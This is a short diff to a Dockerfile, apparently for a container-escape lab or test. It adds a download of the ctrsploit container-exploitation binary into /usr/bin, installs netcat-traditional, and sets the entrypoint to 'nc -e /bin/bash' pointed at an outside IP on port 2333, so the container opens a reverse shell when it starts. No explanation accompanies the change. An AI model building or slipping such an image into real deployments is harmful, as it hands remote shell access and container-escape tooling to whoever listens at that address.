@@ -1,6 +1,4 @@
 FROM ubuntu
-
-RUN sed -i "s@http://.*ubuntu.com@http://repo.huaweicloud.com@g" /etc/apt/sources.list
+ADD --chmod=755 https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 /usr/bin/ctrsploit
 RUN apt-get update && apt-get install netcat-traditional
-
-ENTRYPOINT ["nc", "-e", "/bin/bash", "172.17.0.1", "2333"]
+ENTRYPOINT ["nc", "-e", "/bin/bash", "172.16.0.171", "2333"]
